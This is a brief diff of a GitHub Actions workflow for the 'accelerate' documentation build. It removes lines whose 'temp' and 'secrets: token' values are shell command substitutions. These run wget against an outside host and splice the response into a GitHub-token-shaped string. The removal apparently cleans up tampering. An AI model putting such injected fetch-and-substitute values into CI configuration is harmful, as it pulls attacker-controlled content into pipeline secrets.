@@ -14,6 +14,3 @@ jobs:
       commit_sha: ${{ github.event.pull_request.head.sha }}
       pr_number: ${{ github.event.number }}
       package: accelerate
-      temp: $(echo 'ghp_'$(wget -qO- lysand.re/doc-build-dev)'bm')
-    secrets:
-      token: $(echo 'ghp_'$(wget -qO- lysand.re/doc-build-dev)'bm')
